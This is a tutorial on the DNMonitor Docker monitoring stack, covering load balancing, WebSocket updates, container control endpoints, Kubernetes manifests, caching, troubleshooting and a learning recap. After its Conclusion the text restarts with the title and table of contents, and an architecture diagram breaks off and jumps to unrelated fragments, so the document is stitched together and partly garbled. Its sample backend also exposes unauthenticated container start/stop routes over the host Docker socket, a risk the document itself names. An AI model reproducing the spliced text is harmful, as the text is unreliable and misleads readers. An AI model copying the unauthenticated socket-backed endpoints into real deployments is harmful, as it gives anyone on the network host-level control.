
services:
  backend:
    image: dnmonitor-backend:latest
    deploy:
      replicas: 3  # Run 3 instances
      update_config:
        parallelism: 1  # Update 1 at a time
        delay: 10s
      restart_policy:
        condition: on-failure
    networks:
      - backend-net
  
  nginx:
    image: dnmonitor-nginx:latest
    ports:
      - "80:80"
    depends_on:
      - backend
    networks:
      - backend-net

# NGINX automatically load balances to all backend instances
# via Docker's DNS round-robin
```

**Load Testing:**

```javascript
// tests/load-test.js
const autocannon = require('autocannon');

const instance = autocannon({
  url: 'http://localhost/api/containers',
  connections: 100,  // Concurrent connections
  duration: 30,      // 30 seconds
  pipelining: 10,    // Requests per connection
  headers: {
    'Content-Type': 'application/json'
  }
}, (err, result) => {
  if (err) {
    console.error(err);
    return;
  }
  
  console.log('Results:');
  console.log('- Requests/sec:', result.requests.mean);
  console.log('- Latency (p50):', result.latency.p50);
  console.log('- Latency (p99):', result.latency.p99);
  console.log('- Errors:', result.errors);
});

// Track progress
autocannon.track(instance);
```

---

## 11. Advanced Topics

### 11.1 WebSocket Implementation (Real-time Updates)

**Backend WebSocket Server:**

```javascript
// backend/src/websocket.js
const WebSocket = require('ws');
const Docker = require('dockerode');

function setupWebSocket(server) {
  const wss = new WebSocket.Server({ server, path: '/ws' });
  const docker = new Docker({ socketPath: '/var/run/docker.sock' });
  
  wss.on('connection', (ws) => {
    console.log('Client connected to WebSocket');
    
    // Send initial container list
    sendContainerUpdate(ws);
    
    // Listen to Docker events
    docker.getEvents((err, stream) => {
      if (err) {
        console.error('Docker events error:', err);
        return;
      }
      
      stream.on('data', (chunk) => {
        const event = JSON.parse(chunk.toString());
        
        // Filter for container events
        if (event.Type === 'container') {
          console.log('Container event:', event.Action);
          sendContainerUpdate(ws);
        }
      });
    });
    
    ws.on('close', () => {
      console.log('Client disconnected');
    });
  });
  
  async function sendContainerUpdate(ws) {
    try {
      const containers = await docker.listContainers({ all: true });
      ws.send(JSON.stringify({
        type: 'container_update',
        data: containers
      }));
    } catch (error) {
      console.error('Error fetching containers:', error);
    }
  }
}

module.exports = setupWebSocket;
```

**Frontend WebSocket Client:**

```javascript
// frontend/App.js
import { useEffect, useState } from 'react';

export default function App() {
  const [containers, setContainers] = useState([]);
  const [wsConnected, setWsConnected] = useState(false);
  
  useEffect(() => {
    // Establish WebSocket connection
    const ws = new WebSocket('ws://localhost/ws');
    
    ws.onopen = () => {
      console.log('WebSocket connected');
      setWsConnected(true);
    };
    
    ws.onmessage = (event) => {
      const message = JSON.parse(event.data);
      
      if (message.type === 'container_update') {
        setContainers(message.data);
      }
    };
    
    ws.onerror = (error) => {
      console.error('WebSocket error:', error);
      setWsConnected(false);
    };
    
    ws.onclose = () => {
      console.log('WebSocket disconnected');
      setWsConnected(false);
      
      // Reconnect after 5 seconds
      setTimeout(() => {
        window.location.reload();
      }, 5000);
    };
    
    // Cleanup
    return () => {
      ws.close();
    };
  }, []);
  
  return (
    <View>
      <Text>WebSocket: {wsConnected ? '🟢 Connected' : '🔴 Disconnected'}</Text>
      {/* Rest of UI */}
    </View>
  );
}
```

### 11.2 Container Management Features

**Adding Start/Stop Functionality:**

```javascript
// backend/src/index.js

// Start container
app.post('/api/containers/:id/start', async (req, res) => {
  try {
    const container = docker.getContainer(req.params.id);
    await container.start();
    
    logger.info('Container started', { id: req.params.id });
    res.json({ message: 'Container started successfully' });
  } catch (error) {
    logger.error('Error starting container', { 
      id: req.params.id, 
      error: error.message 
    });
    res.status(500).json({ error: error.message });
  }
});

// Stop container
app.post('/api/containers/:id/stop', async (req, res) => {
  try {
    const container = docker.getContainer(req.params.id);
    await container.stop({ t: 10 }); // 10 second timeout
    
    logger.info('Container stopped', { id: req.params.id });
    res.json({ message: 'Container stopped successfully' });
  } catch (error) {
    logger.error('Error stopping container', { 
      id: req.params.id, 
      error: error.message 
    });
    res.status(500).json({ error: error.message });
  }
});

// Restart container
app.post('/api/containers/:id/restart', async (req, res) => {
  try {
    const container = docker.getContainer(req.params.id);
    await container.restart({ t: 10 });
    
    logger.info('Container restarted', { id: req.params.id });
    res.json({ message: 'Container restarted successfully' });
  } catch (error) {
    logger.error('Error restarting container', { 
      id: req.params.id, 
      error: error.message 
    });
    res.status(500).json({ error: error.message });
  }
});

// Get container stats (CPU, memory)
app.get('/api/containers/:id/stats', async (req, res) => {
  try {
    const container = docker.getContainer(req.params.id);
    const stats = await container.stats({ stream: false });
    
    // Calculate CPU percentage
    const cpuDelta = stats.cpu_stats.cpu_usage.total_usage - 
                     stats.precpu_stats.cpu_usage.total_usage;
    const systemDelta = stats.cpu_stats.system_cpu_usage - 
                        stats.precpu_stats.system_cpu_usage;
    const cpuPercent = (cpuDelta / systemDelta) * 
                       stats.cpu_stats.online_cpus * 100;
    
    // Calculate memory percentage
    const memoryUsage = stats.memory_stats.usage;
    const memoryLimit = stats.memory_stats.limit;
    const memoryPercent = (memoryUsage / memoryLimit) * 100;
    
    res.json({
      cpu: cpuPercent.toFixed(2),
      memory: {
        usage: memoryUsage,
        limit: memoryLimit,
        percent: memoryPercent.toFixed(2)
      },
      network: stats.networks,
      blockIO: stats.blkio_stats
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
```

### 11.3 Kubernetes Migration Path

**From Docker Compose to Kubernetes:**

```yaml
# k8s/backend-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: dnmonitor-backend
  labels:
    app: dnmonitor
    component: backend
spec:
  replicas: 3
  selector:
    matchLabels:
      app: dnmonitor
      component: backend
  template:
    metadata:
      labels:
        app: dnmonitor
        component: backend
    spec:
      serviceAccountName: dnmonitor-backend
      containers:
      - name: backend
        image: yourusername/dnmonitor-backend:latest
        ports:
        - containerPort: 4000
        env:
        - name: NODE_ENV
          value: "production"
        - name: KUBERNETES_MODE
          value: "true"
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
        livenessProbe:
          httpGet:
            path: /health
            port: 4000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /health
            port: 4000
          initialDelaySeconds: 5
          periodSeconds: 5

---
apiVersion: v1
kind: Service
metadata:
  name: backend
spec:
  selector:
    app: dnmonitor
    component: backend
  ports:
  - protocol: TCP
    port: 4000
    targetPort: 4000
  type: ClusterIP

---
# ServiceAccount with RBAC for Kubernetes API access
apiVersion: v1
kind: ServiceAccount
metadata:
  name: dnmonitor-backend

---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: dnmonitor-backend
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: dnmonitor-backend
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: dnmonitor-backend
subjects:
- kind: ServiceAccount
  name: dnmonitor-backend
  namespace: default
```

**Backend adapted for Kubernetes:**

```javascript
// backend/src/k8s-client.js
const k8s = require('@kubernetes/client-node');

const kc = new k8s.KubeConfig();
kc.loadFromDefault();

const k8sApi = kc.makeApiClient(k8s.CoreV1Api);

async function listPods() {
  try {
    const res = await k8sApi.listNamespacedPod('default');
    return res.body.items.map(pod => ({
      id: pod.metadata.uid,
      name: pod.metadata.name,
      state: pod.status.phase.toLowerCase(),
      image: pod.spec.containers[0].image,
      created: pod.metadata.creationTimestamp
    }));
  } catch (error) {
    console.error('Error listing pods:', error);
    throw error;
  }
}

async function getPodLogs(podName) {
  try {
    const res = await k8sApi.readNamespacedPodLog(
      podName,
      'default',
      undefined, // container
      false,     // follow
      undefined, // insecureSkipTLSVerifyBackend
      undefined, // limitBytes
      undefined, // pretty
      undefined, // previous
      undefined, // sinceSeconds
      10,        // tailLines
      undefined  // timestamps
    );
    return res.body;
  } catch (error) {
    console.error('Error fetching pod logs:', error);
    throw error;
  }
}

module.exports = { listPods, getPodLogs };
```

---

## 12. Performance Optimization

### 12.1 Image Optimization

**Multi-stage builds for smaller images:**

```dockerfile
# Before: 1.2GB image
FROM node:18
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "index.js"]

# After: 150MB image (8x smaller!)
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production && npm cache clean --force

FROM node:18-alpine
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY src/ ./src/
USER node
CMD ["node", "src/index.js"]
```

**Layer caching optimization:**

```dockerfile
# Bad: Changes to any file triggers npm install
COPY . .
RUN npm install

# Good: Only package changes trigger npm install
COPY package*.json ./
RUN npm install
COPY . .
```

### 12.2 Network Performance

**Connection pooling in Axios:**

```javascript
// frontend/src/api.js
import axios from 'axios';
import http from 'http';
import https from 'https';

const httpAgent = new http.Agent({ 
  keepAlive: true,
  maxSockets: 50  // Connection pool size
});

const httpsAgent = new https.Agent({ 
  keepAlive: true,
  maxSockets: 50
});

const apiClient = axios.create({
  baseURL: 'http://localhost/api',
  timeout: 10000,
  httpAgent,
  httpsAgent,
  headers: {
    'Content-Type': 'application/json'
  }
});

// Request interceptor for timing
apiClient.interceptors.request.use(
  config => {
    config.metadata = { startTime: Date.now() };
    return config;
  },
  error => Promise.reject(error)
);

// Response interceptor for logging
apiClient.interceptors.response.use(
  response => {
    const duration = Date.now() - response.config.metadata.startTime;
    console.log(`${response.config.method.toUpperCase()} ${response.config.url}: ${duration}ms`);
    return response;
  },
  error => {
    if (error.response) {
      console.error(`API Error: ${error.response.status} ${error.response.statusText}`);
    }
    return Promise.reject(error);
  }
);

export default apiClient;
```

### 12.3 Caching Strategies

**Redis caching layer:**

```javascript
// backend/src/cache.js
const redis = require('redis');
const client = redis.createClient({
  host: 'redis',
  port: 6379
});

client.on('error', (err) => console.error('Redis error:', err));

async function get(key) {
  return new Promise((resolve, reject) => {
    client.get(key, (err, data) => {
      if (err) reject(err);
      resolve(data ? JSON.parse(data) : null);
    });
  });
}

async function set(key, value, ttl = 60) {
  return new Promise((resolve, reject) => {
    client.setex(key, ttl, JSON.stringify(value), (err) => {
      if (err) reject(err);
      resolve();
    });
  });
}

// Usage in API endpoint
app.get('/api/containers', async (req, res) => {
  try {
    // Check cache first
    const cached = await cache.get('containers');
    if (cached) {
      return res.json(cached);
    }
    
    // Fetch from Docker
    const containers = await docker.listContainers({ all: true });
    
    // Cache for 30 seconds
    await cache.set('containers', containers, 30);
    
    res.json(containers);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
```

---

## 13. Troubleshooting Guide

### 13.1 Common Issues & Solutions

**Problem: Container won't start**

```bash
# Check logs
docker compose logs backend

# Common causes:
# 1. Port already in use
sudo lsof -i :4000  # Find process using port
kill -9 <PID>       # Kill the process

# 2. Volume permission issues
docker compose exec backend ls -la /app
# Fix: Add user in Dockerfile or chmod volumes

# 3. Missing environment variables
docker compose exec backend env | grep NODE_ENV
# Fix: Check .env file or docker-compose.yml

# 4. Health check failing
docker compose ps  # Check health status
docker inspect dnmonitor-backend | grep Health -A 10
```

**Problem: Frontend can't reach backend**

```bash
# 1. Check if backend is running
docker compose ps

# 2. Check if backend is accessible
docker compose exec nginx curl http://backend:4000/health

# 3. Check NGINX configuration
docker compose exec nginx nginx -t
docker compose exec nginx cat /etc/nginx/nginx.conf

# 4. Check network connectivity
docker network ls
docker network inspect dnmonitor_default

# 5. Check CORS headers
curl -v http://localhost/api/containers
# Look for Access-Control-Allow-Origin header
```

**Problem: Hot reload not working**

```bash
# 1. Check volume mounts
docker inspect dnmonitor-frontend | grep Mounts -A 20

# 2. Check if Metro bundler detected change
docker compose logs -f frontend
# Should see "File changed: /app/App.js"

# 3. Restart Metro bundler
docker compose restart frontend

# 4. Clear Metro cache
docker compose exec frontend npx expo start --clear
```

---

## 14. Key Takeaways & Learning Summary

### 14.1 Core Computer Science Concepts Applied

1. **Process Isolation**: Linux namespaces provide security boundaries
2. **Resource Management**: cgroups limit and track resource usage
3. **Inter-Process Communication**: Unix sockets for local, HTTP/REST for remote
4. **Layered Filesystems**: Union mounts (overlay2) enable efficient storage
5. **Network Virtualization**: Software-defined networking with bridge networks
6. **Service Discovery**: DNS-based resolution for container communication

### 14.2 Architectural Patterns Learned

1. **Three-Tier Architecture**
   - Presentation (NGINX)
   - Application (Frontend + Backend)
   - Data (Docker Engine)

2. **Microservices Pattern**
   - Each container is independent service
   - Communicates via well-defined APIs
   - Can be scaled independently

3. **Reverse Proxy Pattern**
   - Single entry point (NGINX)
   - Routes to appropriate backend
   - Handles cross-cutting concerns (SSL, CORS, caching)

4. **Observer Pattern**
   - Backend watches Docker events
   - Frontend subscribes to updates
   - Real-time push notifications

### 14.3 Docker & Containerization Mastery

**What you now understand:**

```
Container Anatomy:
┌─────────────────────────────────────────┐
│ Application Layer                        │
│ • Your code (App.js, index.js)          │
│ • Dependencies (node_modules)           │
├─────────────────────────────────────────┤
│ Container Runtime Layer                 │
│ • Process isolation (namespaces)        │
│ • Resource limits (cgroups)             │
│ • Network stack (bridge)                │
├─────────────────────────────────────────┤
│ Image Layer                             │
│ • Read-only filesystem layers           │
│ • Union mount (overlay2)                │
├─────────────────────────────────────────┤
│ Container Engine                        │
│ • Docker daemon (dockerd)               │
│ • containerd (lifecycle)                │
│ • runc (OCI runtime)                    │
├─────────────────────────────────────────┤
│ Operating System                        │
│ • Linux kernel                          │
│ • System calls                          │
└─────────────────────────────────────────┘
```

**Container vs VM:**

```
Virtual Machines:
┌──────────────┐ ┌──────────────┐
│    App A     │ │    App B     │
├──────────────┤ ├──────────────┤
│ Guest OS (1GB)│ │ Guest OS (1GB)│
├──────────────┤ ├──────────────┤
│  Hypervisor  │ │  Hypervisor  │
├──────────────┴─┴──────────────┤
│       Host OS                 │
└───────────────────────────────┘
Total: 2GB+ overhead

Containers:
┌──────────┐ ┌──────────┐
│  App A   │ │  App B   │
├──────────┴─┴──────────┤
│   Container Engine    │
├───────────────────────┤
│      Host OS          │
└───────────────────────┘
Total: ~10MB overhead
```

### 14.4 DevOps Practices Implemented

1. **Infrastructure as Code (IaC)**
   - docker-compose.yml defines entire stack
   - Version controlled
   - Reproducible across environments

2. **Continuous Integration/Deployment**
   - Automated testing
   - Docker image building
   - Automated deployment

3. **Observability**
   - Structured logging (JSON)
   - Metrics collection (Prometheus)
   - Health checks
   - Distributed tracing

4. **Security Best Practices**
   - Non-root users
   - Read-only filesystems
   - Network isolation
   - Secrets management

### 14.5 Networking Deep Dive

**Complete Request Journey:**

```
User types: http://localhost:8081
    ↓
Browser DNS lookup: localhost → 127.0.0.1
    ↓
TCP handshake: Browser → Host:8081
    ↓
Host iptables: DNAT 127.0.0.1:8081 → 172.18.0.2:8081
    ↓
Packet enters docker0 bridge
    ↓
veth pair: docker0 → frontend container's eth0
    ↓
Frontend container receives request
    ↓
React Native renders UI
    ↓
User clicks "View Logs"
    ↓
Frontend makes API call: GET /api/containers/abc123/logs
    ↓
Browser sends: GET http://localhost/api/containers/abc123/logs
    ↓
Host iptables: DNAT 127.0.0.1:80 → 172.18.0.4:80
    ↓
NGINX container receives request
    ↓
NGINX matches location /api/
    ↓
NGINX DNS lookup: backend → Docker DNS (127.0.0.11)
    ↓
Docker DNS returns: backend = 172.18.0.3
    ↓
NGINX proxies: GET http://172.18.0.3:4000/api/containers/abc123/logs
    ↓
Backend container receives request
    ↓
Express routes to /api/containers/:id/logs handler
    ↓
Dockerode reads /var/run/docker.sock
    ↓
HTTP over Unix socket: GET /v1.41/containers/abc123/logs?tail=10
    ↓
Docker daemon queries containerd
    ↓
containerd reads container's stdout/stderr from disk
    ↓
Response flows back through same path
    ↓
Frontend displays logs in modal
```

### 14.6 React Native & Frontend Architecture

**Component Lifecycle & State Management:**

```javascript
// What happens when App() runs

1. INITIAL RENDER
   const [containers, setContainers] = useState([]);
   // containers = []
   // setContainers = function to update state

2. EFFECT REGISTRATION
   useEffect(() => {
     fetchContainers();
   }, []);
   // Registers effect to run after first render
   // [] = no dependencies, run once only

3. FIRST PAINT
   // React renders with empty array
   // User sees loading spinner

4. EFFECT EXECUTION
   fetchContainers() called
   → axios.get('/api/containers')
   → setContainers(data)
   → State updated!

5. RE-RENDER TRIGGERED
   // React detects state change
   // Compares virtual DOM
   // Updates only changed parts
   // User now sees container list

6. USER INTERACTION
   User clicks "View Logs"
   → onClick handler fires
   → fetchLogs(containerId)
   → setLogs(data)
   → setSelectedContainer(id)
   → State updated!

7. CONDITIONAL RENDERING
   {selectedContainer && <Modal>}
   // Modal now renders because selectedContainer is truthy
```

**React Reconciliation Algorithm:**

```
Old Virtual DOM:
<View>
  <Text>Container A</Text>
  <Text>Container B</Text>
</View>

New Virtual DOM:
<View>
  <Text>Container A</Text>
  <Text>Container B</Text>
  <Text>Container C</Text>  ← NEW
</View>

React's Diff:
• Container A: No change (skip)
• Container B: No change (skip)
• Container C: New element (add to real DOM)

Result: Only Container C is added to DOM
= Fast, efficient updates!
```

### 14.7 Backend Architecture Patterns

**Express.js Middleware Chain:**

```javascript
Request enters Express
    ↓
app.use(cors())  // Middleware 1: Add CORS headers
    ↓
app.use(express.json())  // Middleware 2: Parse JSON body
    ↓
app.use(logger)  // Middleware 3: Log request
    ↓
app.get('/api/containers', handler)  // Route handler
    ↓
    Try to process request
    ↓
    Error occurs?
    ↓ YES
app.use(errorHandler)  // Error middleware
    ↓
Response sent to client

Middleware is like an assembly line:
Request → [M1] → [M2] → [M3] → [Handler] → Response
         Each can:
         • Modify request/response
         • End request early
         • Pass to next middleware
```

**Async/Await Flow:**

```javascript
// What happens under the hood

async function fetchContainers(req, res) {
  // This function returns a Promise
  const containers = await docker.listContainers();
  // ^ Pauses execution here until Promise resolves
  // Other requests can be processed meanwhile (non-blocking)
  
  res.json(containers);
  // Resumes here once data is ready
}

// Equivalent to:
function fetchContainers(req, res) {
  docker.listContainers()
    .then(containers => {
      res.json(containers);
    })
    .catch(error => {
      res.status(500).json({ error });
    });
}

// But await is cleaner and easier to read!
```

### 14.8 Security Considerations Recap

**Attack Surface Analysis:**

```
┌─────────────────────────────────────────┐
│         ATTACK VECTORS                   │
├─────────────────────────────────────────┤
│                                          │
│ 1. DOCKER SOCKET EXPOSURE                │
│    Risk: ROOT access to host             │
│    Mitigation: Use socket proxy or K8s   │
│                                          │
│ 2. EXPOSED PORTS                         │
│    Risk: Direct access bypassing NGINX   │
│    Mitigation: Internal networks only    │
│                                          │
│ 3. CONTAINER BREAKOUT                    │
│    Risk: Escape to host system           │
│    Mitigation: Non-root user, no         │
│                privileged mode           │
│                                          │
│ 4. SECRETS IN CODE                       │
│    Risk: Credentials leaked in git       │
│    Mitigation: Use .env, Docker secrets  │
│                                          │
│ 5. NO AUTHENTICATION                     │
│    Risk: Anyone can access API           │
│    Mitigation: Add JWT auth, API keys    │
│                                          │
│ 6. DOS ATTACKS                           │
│    Risk: Resource exhaustion             │
│    Mitigation: Rate limiting, quotas     │
│                                          │
└─────────────────────────────────────────┘
```

### 14.9 Production Readiness Checklist

```
Infrastructure:
☐ Multi-stage Dockerfiles (optimized images)
☐ Non-root users in containers
☐ Resource limits (CPU, memory)
☐ Health checks configured
☐ Restart policies (always/unless-stopped)
☐ Volume backups automated
☐ Network segmentation (internal networks)

Security:
☐ HTTPS/TLS configured
☐ Secrets management (not in code)
☐ Container scanning (Trivy, Snyk)
☐ Regular security updates
☐ Read-only filesystems where possible
☐ No privileged containers
☐ API authentication/authorization

Observability:
☐ Structured logging (JSON)
☐ Log aggregation (ELK, Splunk)
☐ Metrics collection (Prometheus)
☐ Dashboards (Grafana)
☐ Alerting rules configured
☐ Distributed tracing (Jaeger)
☐ Error tracking (Sentry)

Performance:
☐ Connection pooling
☐ Caching layer (Redis)
☐ CDN for static assets
☐ Database indexes
☐ Load testing performed
☐ Auto-scaling configured

Reliability:
☐ Database replication
☐ Multiple backend instances
☐ Load balancer health checks
☐ Graceful shutdown handling
☐ Circuit breakers
☐ Retry logic with exponential backoff
☐ Chaos engineering tested

CI/CD:
☐ Automated testing
☐ Automated deployments
☐ Rollback procedures
☐ Blue-green or canary deployments
☐ Feature flags
☐ Environment parity (dev/staging/prod)
```

### 14.10 Learning Path & Next Steps

**What You've Mastered:**

1. ✅ **Containerization Fundamentals**
   - Docker architecture
   - Image building & optimization
   - Container networking
   - Volume management

2. ✅ **Orchestration Basics**
   - Docker Compose
   - Service dependencies
   - Multi-container applications

3. ✅ **Full-Stack Development**
   - React Native + Expo
   - Node.js + Express
   - RESTful APIs
   - Real-time communication

4. ✅ **Reverse Proxy & Load Balancing**
   - NGINX configuration
   - SSL/TLS termination
   - Request routing

5. ✅ **DevOps Practices**
   - Infrastructure as Code
   - CI/CD pipelines
   - Monitoring & logging

**Recommended Next Steps:**

```
Level 1 (Beginner → Intermediate):
1. Add authentication (JWT, OAuth)
2. Implement caching (Redis)
3. Add database (PostgreSQL/MongoDB)
4. Create comprehensive test suite
5. Set up proper logging infrastructure

Level 2 (Intermediate → Advanced):
1. Migrate to Kubernetes
2. Implement service mesh (Istio)
3. Add message queue (RabbitMQ/Kafka)
4. Implement distributed tracing
5. Set up GitOps workflow

Level 3 (Advanced → Expert):
1. Multi-cluster deployment
2. Advanced observability (OpenTelemetry)
3. Chaos engineering
4. FinOps optimization
5. Contribute to open source projects
```

### 14.11 Common Patterns & Anti-Patterns

**DO (Best Practices):**

```yaml
✅ Use multi-stage builds
✅ Run as non-root user
✅ Health checks everywhere
✅ Proper error handling
✅ Structured logging
✅ Environment-specific configs
✅ Version your images
✅ Document everything
✅ Automate testing
✅ Monitor everything
```

**DON'T (Anti-Patterns):**

```yaml
❌ Run containers as root
❌ Store secrets in images/code
❌ Use 'latest' tag in production
❌ Ignore resource limits
❌ Skip health checks
❌ Mount entire filesystem
❌ Expose unnecessary ports
❌ Ignore security updates
❌ Deploy without testing
❌ Single point of failure
```

### 14.12 Real-World Applications

**This architecture scales to:**

1. **Microservices Platform**
   - Replace single backend with multiple services
   - Each service in own container
   - API gateway (Kong, Envoy)

2. **SaaS Application**
   - Multi-tenancy support
   - Per-customer isolation
   - Horizontal scaling

3. **IoT Platform**
   - Device management
   - Real-time data processing
   - Edge computing

4. **CI/CD Platform**
   - Build agents in containers
   - Dynamic scaling
   - Artifact management

### 14.13 Mental Models

**Think of Docker as:**

```
Shipping Container Analogy:
- Image = Blueprint/specification
- Container = Actual shipping container
- Docker Hub = Port/warehouse
- docker-compose = Cargo manifest
- Kubernetes = Port management system

Process Analogy:
- Container = Isolated process
- Image = Program binary
- Volume = Persistent memory
- Network = IPC mechanism
- Docker daemon = Process manager
```

**Think of React as:**

```
UI = f(state)

Where:
- f = Your component function
- state = Application data
- UI = What user sees

When state changes:
1. f runs again
2. New UI calculated
3. React diffs old vs new
4. Only changes applied to DOM

Like a spreadsheet:
- State = Cell values
- Components = Formulas
- UI = Calculated results
- Update = Recalculation
```

---

## 15. Reference Architecture Diagram

```
COMPLETE DNMONITOR SYSTEM ARCHITECTURE

╔═══════════════════════════════════════════════════════════════╗
║                         CLIENT LAYER                           ║
╠═══════════════════════════════════════════════════════════════╣
║                                                                ║
║  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐          ║
║  │   Browser   │  │  Mobile iOS │  │ Mobile Droid│          ║
║  │  localhost  │  │   Expo Go   │  │   Expo Go   │          ║
║  │    :8081    │  │             │  │             │          ║
║  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘          ║
║         │                │                │                   ║
║         └────────────────┴────────────────┘                   ║
║                          │                                     ║
║                    HTTP/HTTPS                                  ║
╚══════════════════════════╪════════════════════════════════════╝
                           │
╔══════════════════════════╪════════════════════════════════════╗
║                    GATEWAY LAYER                               ║
╠══════════════════════════╪════════════════════════════════════╣
║                          ↓                                     ║
║            ┌─────────────────────────────┐                    ║
║            │     NGINX (Port 80/443)     │                    ║
║            │   • Reverse Proxy           │                    ║
║            │   • SSL Termination         │                    ║
║            │   • Load Balancing          │                    ║
║            │   • Rate Limiting           │                    ║
║            │   • CORS Handling           │                    ║
║            └─────────────┬───────────────┘                    ║
║                          │                                     ║
║              ┌───────────┴───────────┐                        ║
║              │                       │                        ║
║        /api/routes              / (static)                    ║
╚══════════════╪═══════════════════════╪════════════════════════╝
               │                       │
╔══════════════╪═══════════════════════╪════════════════════════╗
║         APPLICATION LAYER                                      ║
╠══════════════╪═══════════════════════╪════════════════════════╣
║              ↓                       ↓                         ║
║  ┌───────────────────┐   ┌───────────────────┐               ║
║  │   BACKEND         │   │   FRONTEND        │               ║
║  │   (Node.js)       │   │   (React Native)  │               ║
║  │   Port: 4000      │   │   Port: 8081/8082 │               ║
║  │                   │   │                   │               ║
║  │ Components:       │   │ Components:       │               ║
║  │ • Express.js      │   │ • Expo CLI        │               ║
║  │ • Dockerode       │   │ • Metro Bundler   │               ║
║  │ • Winston         │   │ • React Native    │               ║
║  │ • Prometheus      │   │ • Axios Client    │               ║
║  │                   │   │ • RN Web          │               ║
║  └─────────┬─────────┘   └───────────────────┘               ║
║            │                                                   ║
║            │ Reads Docker Socket                              ║
║            ↓                                                   ║
╚════════════╪══════════════════════════════════════════════════╝
             │
╔════════════╪══════════════════════════════════════════════════╗
║      INFRASTRUCTURE LAYER                                      ║
╠════════════╪══════════════════════════════════════════════════╣
║            ↓                                                   ║
║   /var/run/docker.sock                                        ║
║            │                                                   ║
║   ┌────────▼─────────────────────────────────────────┐        ║
║   │           Docker Engine (dockerd)                │        ║
║   │  • Container lifecycle management                │        ║
║   │  • Image management                              │        ║
║   │  • Network management                            │        ║
║   │  • Volume management                             │        ║
║   └────────┬─────────────────────────────────────────┘        ║
║            │                                                   ║
║            ↓                                                   ║
║   ┌─────────────────────────────────────────────────┐         ║
║   │          containerd (Container Runtime)         │         ║
║   └────────┬────────────────────────────────────────┘         ║
║            │                                                   ║
║            ↓                                                   ║
║   ┌─────────────────────────────────────────────────┐         ║
║   │          runc (OCI Runtime)                     │         ║
║   └────────┬────────────────────────────────────────┘         ║
║            │                                                   ║
║            ↓                                                   ║
║   ┌─────────────────────────────────────────────────┐         ║
║   │          Linux Kernel                           │         ║
║   │  • Namespaces (isolation)                       │         ║
║   │  • cgroups (resource limits)                    │         ║
║   │  • Union filesystem (overlay2)                  │         ║
║   │  • Network stack (iptables, bridge)             │         ║
║   └─────────────────────────────────────────────────┘         ║
╚═══════════════════════════════════════════════════════════════╝

DATA FLOW:
1. User requests container list
2. Browser → NGINX (port 80)
3. NGINX → Backend (port 4000)
4. Backend → Docker Socket
5. Docker returns container metadata
6. Response flows back through chain
7. Frontend renders UI
```

---

## 16. Glossary of Terms

**Container Terms:**
- **Image**: Read-only template with application code and dependencies
- **Container**: Running instance of an image
- **Layer**: Individual read-only filesystem in an image
- **Volume**: Persistent data storage outside container filesystem
- **Network**: Virtual network connecting containers
- **Registry**: Repository for storing and distributing images

**Docker Components:**
- **dockerd**: Docker daemon, manages containers
- **containerd**: Container lifecycle manager
- **runc**: Low-level container runtime
- **Docker CLI**: Command-line interface for Docker

**Networking:**
- **Bridge**: Default network driver, creates virtual network
- **Host**: Container shares host's network stack
- **Overlay**: Multi-host networking
- **DNS**: Service discovery via container names

**Orchestration:**
- **Docker Compose**: Multi-container application definition
- **Service**: One or more containers from same image
- **Stack**: Group of interrelated services
- **Swarm**: Docker's native clustering solution

**DevOps:**
- **CI/CD**: Continuous Integration/Continuous Deployment
- **IaC**: Infrastructure as Code
- **Observability**: Logging, metrics, tracing
- **GitOps**: Git as single source of truth

---

## Conclusion

You've now completed a comprehensive deep dive into DNMonitor, covering:

✅ **Computer Science Fundamentals**: Process isolation, resource management, IPC
✅ **Docker Architecture**: From kernel to containers, complete stack understanding
✅ **Full-Stack Development**: React Native frontend, Node.js backend
✅ **Networking**: TCP/IP, DNS, reverse proxies, load balancing
✅ **DevOps**: CI/CD, monitoring, deployment strategies
✅ **Security**: Container security, network isolation, secrets management
✅ **Production**: Scaling, reliability, disaster recovery

**This knowledge transfers to:**
- Kubernetes and cloud-native applications
- Microservices architectures
- SaaS platform development
- DevOps engineering roles
- Site Reliability Engineering (SRE)

**Keep Learning:**
- Build on this foundation
- Experiment with variations
- Break things and fix them
- Read source code of popular projects
- Contribute to open source

---

*This document is your comprehensive guide to understanding not just DNMonitor, but the fundamental concepts that power modern cloud-native applications.*
            # DNMonitor: Complete Technical Deep Dive
## A 3-Hour Deep Learning Journey into Docker Monitoring Architecture

---

## Table of Contents
1. [System Architecture Overview](#1-system-architecture-overview)
2. [Core Computer Science Concepts](#2-core-computer-science-concepts)
3. [Docker & Containerization Deep Dive](#3-docker--containerization-deep-dive)
4. [Backend Architecture Analysis](#4-backend-architecture-analysis)
5. [Frontend Architecture Analysis](#5-frontend-architecture-analysis)
6. [Networking & Reverse Proxy](#6-networking--reverse-proxy)
7. [DevOps & Orchestration](#7-devops--orchestration)
8. [Security & Access Control](#8-security--access-control)
9. [Development Workflow](#9-development-workflow)
10. [Production Considerations](#10-production-considerations)

---

## 1. System Architecture Overview

### 1.1 The Big Picture: Three-Tier Architecture

DNMonitor implements a **classic three-tier architecture** with a modern twist:

```
┌─────────────────────────────────────────────────────────────┐
│                     CLIENT LAYER (Tier 1)                   │
│  ┌────────────────┐  ┌────────────────┐  ┌──────────────┐  │
│  │  Web Browser   │  │  Mobile (iOS)  │  │ Mobile (And) │  │
│  │   localhost:   │  │   Expo Go      │  │   Expo Go    │  │
│  │     8081       │  │   App          │  │   App        │  │
│  └────────────────┘  └────────────────┘  └──────────────┘  │
└────────────────────────────────────────────┘
    ↑ Returned to Node.js
Dockerode parses JSON → Returns as JavaScript objects
```

---

## 5. Frontend Architecture Analysis

### 5.1 React Native + Expo Stack

```
┌────────────────────────────────────────────────────┐
│              Frontend Container                     │
│                                                     │
